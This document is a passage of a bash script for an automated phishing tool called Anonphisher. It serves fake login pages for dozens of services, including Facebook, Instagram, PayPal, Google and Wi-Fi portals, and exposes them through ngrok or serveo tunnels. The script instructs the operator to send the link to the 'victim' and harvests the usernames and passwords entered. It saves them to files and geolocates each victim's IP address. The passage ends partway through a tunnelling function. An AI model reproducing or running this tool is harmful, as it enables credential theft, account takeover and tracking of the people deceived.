#!/bin/bash
#Author: AnonyminHack5
echo -e "\e[1;92m Setting up environment for ANONPHISHER...\e[0m"
sleep 0.5
clear
trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "php is required but it's not installed. Install it by using pkg install php. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {

printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m  Origin\e[0m         \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Update\e[0m\n" 
printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;93m Author\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m vk\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m adobe\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m badoo\e[0m\n"
printf "\e[1;34m==================================================\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m cryptocoin\e[0m \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m deviantart\e[0m \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m dropbox\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m ebay\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m paypal\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m pinterest\e[0m\n"  
printf "\e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m playstation\e[0m\e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m reddit\e[0m     \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;93m xbox\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;93m yandex\e[0m     \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;93m twitch\e[0m     \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;93m stackoverflow\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;93m messenger\e[0m  \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;93m shopify\e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;93m shopping\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;93m verizon\e[0m    \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;93m quora\e[0m      \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;93m bet9ja\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;93m Wi-Fi\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option


if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
facebook
elif [[ $option == 3 ]]; then
server="snapchat"
start
elif [[ $option == 4 ]]; then
server="twitter"
start
elif [[ $option == 5 ]]; then
server="github"
start
elif [[ $option == 6 ]]; then
server="google"
start

elif [[ $option == 7 ]]; then
server="spotify"
start

elif [[ $option == 8 ]]; then
server="netflix"
start

elif [[ $option == 9 ]]; then
server="origin"
start

elif [[ $option == 10 ]]; then
server="steam"
start

elif [[ $option == 11 ]]; then
server="yahoo"
start

elif [[ $option == 12 ]]; then
server="linkedin"
start

elif [[ $option == 13 ]]; then
server="protonmail"
start

elif [[ $option == 14 ]]; then
server="wordpress"
start

elif [[ $option == 15 ]]; then
server="microsoft"
start

elif [[ $option == 16 ]]; then
server="instafollowers"
start

elif [[ $option == 17 ]]; then
server="gitlab"
start

elif [[ $option == 18 ]]; then
server="create"
createpage
start

elif [[ $option == 19 ]]; then
echo -e "\e[101m Bye!!.. and have a good day bye👋 \e[0m"
sleep 0.5
exit 1 

elif [[ $option == 20 ]]; then
sleep 2
echo "Updating anonphisher... " | lolcat
sleep 0.5
clear
cd $HOME
rm -rf anonphisher
git clone https://github.com/TermuxHackz/anonphisher
cd anonphisher
echo ""
sleep 0.5
echo -e "\e[100m [!] Anonphisher has been updated! [!] \e[0m"
sleep 3
bash install.sh
echo ""

elif [[ $option == 21 ]]; then
clear
printf "\n"
sleep 0.5
printf "\e[1;92m============\e[0m\e[1;91m[\e[0m\e[1;93mAuthor\e[0m\e[1;91m]\e[0m\e[1;92m============\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Telegram: \e[0m\e[1;37mAnonyminHack5 \e[0m\e[1;97m  [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Twitter: \e[0m\e[1;34mAnonyminHack5 \e[0m\e[1;97m   [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Facebook: \e[0m\e[1;36mAnonyminHack5 \e[0m\e[1;97m  [•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Created by \e[0m\e[1;37mAnonyminHack5 \e[0m\e[1;97m [•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Team: \e[0m\e[1;34mTermuxHackz Society \e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Github: \e[0m\e[1;36mTermuxHackz \e[0m\e[1;97m      [•] \e[0m\n"
sleep 0.5
printf "\e[1;92m==========\e[0m\e[1;91m[\e[0m\e[1;93mAnonphisher\e[0m\e[1;91m]\e[0m\e[1;92m==========\e[0m\n"
sleep 0.5
printf "\n"
sleep 0.5
echo -e "\e[1;98m Press enter to go back \e[0m\e[1;37m or CTRL + C \e[0m\e[1;92mto exit\e[0m"
read a1
clear
banner
menu

elif [[ $option == 22 ]]; then
vk

elif [[ $option == 23 ]]; then
website="adobe"
tunnel_menu

elif [[ $option == 24 ]]; then
website="badoo"
tunnel_menu

elif [[ $option == 25 ]]; then
website="cryptocoinsniper"
tunnel_menu 

elif [[ $option == 26 ]]; then
website="deviantart"
tunnel_menu 

elif [[ $option == 27 ]]; then
website="dropbox"
tunnel_menu

elif [[ $option == 28 ]]; then
website="ebay"
tunnel_menu

elif [[ $option == 29 ]]; then
website="paypal"
tunnel_menu

elif [[ $option == 30 ]]; then
website="pinterest"
tunnel_menu

elif [[ $option == 31 ]]; then
website="playstation"
tunnel_menu

elif [[ $option == 32 ]]; then
website="reddit"
tunnel_menu

elif [[ $option == 33 ]]; then
website="xbox"
tunnel_menu

elif [[ $option == 34 ]]; then
website="yandex"
tunnel_menu

elif [[ $option == 35 ]]; then
website="twitch"
tunnel_menu

elif [[ $option == 36 ]]; then
website="stackoverflow"
tunnel_menu

elif [[ $option == 37 ]]; then
website="messenger"
tunnel_menu

elif [[ $option == 38 ]]; then
website="shopify"
tunnel_menu

elif [[ $option == 39 ]]; then
website="shopping"
tunnel_menu

elif [[ $option == 40 ]]; then
website="verizon"
tunnel_menu

elif [[ $option == 41 ]]; then
website="quora"
tunnel_menu

elif [[ $option == 42 ]]; then
website="bet9ja"
tunnel_menu

elif [[ $option == 43 ]]; then
website="Wi-Fi"
tunnel_menu

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

facebook(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page?\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page?\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option


if [[ $fb_option == 1 || $fb_option == 01 ]]; then
website="facebook"
tunnel_menu
elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
website="fb_advanced"
tunnel_menu
elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
website="fb_security"
tunnel_menu
elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
website="fb_messenger"
tunnel_menu

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi


}

vk(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' vk_option


if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

banner() {
printf "\e[1;78m                          \e[0m\n"
printf "\e[1;31m             +-+-+-+-+-+-+-+-+-+-+-+  \e[0m\n"
printf "\e[1;32m             |A|n|o|n|p|h|i|s|h|e|r|  \e[0m\n"
printf "\e[1;33m             +-+-+-+-+-+-+-+-+-+-+-+  \e[0m\n"
printf "\e[1;34m                   \e[0m\e[1;35mv1.0    \e[0m\n"
printf "\n"
printf "\e[1;93m  [*]\e[0m\e[1;67m Automated phishing tool by: AnonyminHack5 [30+ templates] \e[0m\e[1;93m[*]\e[0m\n"
printf "\e[1;93m     [*]\e[0m\e[1;37m Team: TermuxHackz Society \e[0m\e[1;93m[*]\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not::\e[0m\n"
printf "  \e[101m\e[1;77m:: Responsible for any misuse or damage caused by anonphisher take care please !::\e[0m\n"
printf "\n"
}

smallbanner() {                                               
printf "\e[1;31m  _____                 _   _     _            \e[0m\n"       
printf "\e[1;32m |  _  |___ ___ ___ ___| |_|_|___| |_ ___ ___   \e[0m\n"
printf "\e[1;33m |     |   | . |   | . |   | |_ -|   | -_|  _|  \e[0m\n"
printf "\e[1;34m |__|__|_|_|___|_|_|  _|_|_|_|___|_|_|___|_|    \e[0m\n"
printf "\e[1;35m                   |_|                          \e[0m\n"
printf "\n"
} 

createpage() {
default_cap1="Wi-fi Session Expired , Try again"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
exit 1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""
else

printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}
checkfound() {


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for victim to open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip

fi
sleep 1
done 

}
tunnel_menu() {

if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

if [[ -d .termuxhackz/www ]]; then
rm -rf .termuxhackz/www
mkdir .termuxhackz/www
else
mkdir .termuxhackz/www
fi

cp -rf sites/$website/* .termuxhackz/www
cp -f sites/ip.php .termuxhackz/www/

def_tunnel_menu="2"
smallbanner
printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok\e[0m\n"
printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m Serveo \e[0m\e[91m[\e[0m\e[93mCurrently Down\e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
printf "\e[0m\e[91m [\e[0m05\e[0m\e[91m]\e[0m\e[93m LocalHostRun\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_ngrok
elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
start_serveo
elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
start_loclx
elif [[ $tunnel_menu == 5 || $tunnel_menu == 05 ]]; then
start_localhostrun

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

start_localhost() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
cd .termuxhackz/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://127.0.0.1:5555\e[0m\n"

datafound

}

start_ngrok() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
cd .termuxhackz/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./.termuxhackz/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 7
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $ngrok_link

datafound
}

start_serveo() {

serveo_default_choose_sub="Y"
serveo_default_sub="$website$RANDOM"
serveo_def_port="5555"

printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;96m %s \e[0m\e[1;91m )\e[0m\e[1;92m : \e[0m\e[1;93m' $serveo_def_port
read serveo_port
serveo_port="${serveo_port:-${serveo_def_port}}"
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
read serveo_choose_sub
serveo_choose_sub="${serveo_choose_sub:-${serveo_default_choose_sub}}"
if [[ $serveo_choose_sub == "Y" || $serveo_choose_sub == "y" || $serveo_choose_sub == "Yes" || $serveo_choose_sub == "yes" ]]; then
serveo_custom_subdomain=true
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m)\e[0m\e[1;92m: \e[0m\e[1;93m' $serveo_default_sub
read serveo_subdomain
serveo_subdomain="${serveo_subdomain:-${serveo_default_sub}}"
sleep 1
fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:$serveo_port\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ...\e[0m\n"
cd .termuxhackz/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
if [[ $serveo_custom_subdomain == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
sleep 7

else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
sleep 7
fi
serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' .nexlink)
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $serveo_link

datafound
}

start_loclx() {

loclx_default_choose_sub="Y"
loclx_default_sub="$website$RANDOM"

printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
read loclx_choose_sub
loclx_choose_sub="${loclx_choose_sub:-${loclx_default_choose_sub}}"
if [[ $loclx_choose_sub == "Y" || $loclx_choose_sub == "y" || $loclx_choose_sub == "Yes" || $loclx_choose_sub == "yes" ]]; then
loclx_custom_subdomain=true
sleep 1
printf "\e[0m\n"
